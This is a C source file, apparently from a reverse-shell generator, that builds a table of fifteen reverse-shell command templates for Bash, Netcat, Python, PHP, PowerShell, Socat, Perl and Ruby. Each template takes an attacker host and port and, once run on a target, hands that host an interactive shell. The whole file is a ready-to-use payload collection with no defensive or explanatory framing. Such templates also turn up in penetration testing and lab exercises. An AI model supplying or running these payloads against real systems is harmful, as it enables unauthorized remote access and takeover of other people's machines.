#include "templates.h"
#include <string.h>

void initialize_templates(ShellTemplate *templates, int *count) {
    int i = 0;

    // === BASH SHELLS ===
    strcpy(templates[i].name, "bash-i");
    strcpy(templates[i].description, "Bash -i classic TCP reverse shell");
    strcpy(templates[i].template, "bash -i >& /dev/tcp/%s/%d 0>&1");
    strcpy(templates[i].category, "Bash");
    i++;

    strcpy(templates[i].name, "bash-udp");
    strcpy(templates[i].description, "Bash UDP reverse shell");
    strcpy(templates[i].template, "bash -i >& /dev/udp/%s/%d 0>&1");
    strcpy(templates[i].category, "Bash");
    i++;

    strcpy(templates[i].name, "bash-readline");
    strcpy(templates[i].description, "Bash read line with exec");
    strcpy(templates[i].template, "exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done");
    strcpy(templates[i].category, "Bash");
    i++;

    // === NETCAT SHELLS ===
    strcpy(templates[i].name, "nc-e");
    strcpy(templates[i].description, "Netcat with -e option");
    strcpy(templates[i].template, "nc -e /bin/sh %s %d");
    strcpy(templates[i].category, "Netcat");
    i++;

    strcpy(templates[i].name, "nc-mkfifo");
    strcpy(templates[i].description, "Netcat with mkfifo (no -e required)");
    strcpy(templates[i].template, "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f");
    strcpy(templates[i].category, "Netcat");
    i++;

    strcpy(templates[i].name, "nc-exe");
    strcpy(templates[i].description, "Windows netcat with -e");
    strcpy(templates[i].template, "nc.exe %s %d -e cmd.exe");
    strcpy(templates[i].category, "Netcat");
    i++;

    // === PYTHON SHELLS ===
    strcpy(templates[i].name, "python-pty");
    strcpy(templates[i].description, "Python with pty for TTY");
    strcpy(templates[i].template, "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'");
    strcpy(templates[i].category, "Python");
    i++;

    strcpy(templates[i].name, "python3");
    strcpy(templates[i].description, "Python3 reverse shell");
    strcpy(templates[i].template, "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'");
    strcpy(templates[i].category, "Python");
    i++;

    // === PHP SHELLS ===
    strcpy(templates[i].name, "php-exec");
    strcpy(templates[i].description, "PHP exec function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
    strcpy(templates[i].category, "PHP");
    i++;

    strcpy(templates[i].name, "php-system");
    strcpy(templates[i].description, "PHP system function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);system(\"/bin/sh -i <&3 >&3 2>&3\");'");
    strcpy(templates[i].category, "PHP");
    i++;

    // === POWERSHELL SHELLS ===
    strcpy(templates[i].name, "powershell");
    strcpy(templates[i].description, "PowerShell TCP client");
    strcpy(templates[i].template, "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
    strcpy(templates[i].category, "PowerShell");
    i++;

    // === SOCAT ===
    strcpy(templates[i].name, "socat-tty");
    strcpy(templates[i].description, "Socat with full TTY");
    strcpy(templates[i].template, "socat TCP:%s:%d EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane");
    strcpy(templates[i].category, "Socat");
    i++;

    // === OTHER SHELLS ===
    strcpy(templates[i].name, "perl");
    strcpy(templates[i].description, "Perl reverse shell");
    strcpy(templates[i].template, "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
    strcpy(templates[i].category, "Other");
    i++;

    strcpy(templates[i].name, "ruby");
    strcpy(templates[i].description, "Ruby reverse shell");
    strcpy(templates[i].template, "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))'");
    strcpy(templates[i].category, "Other");
    i++;

    *count = i;
}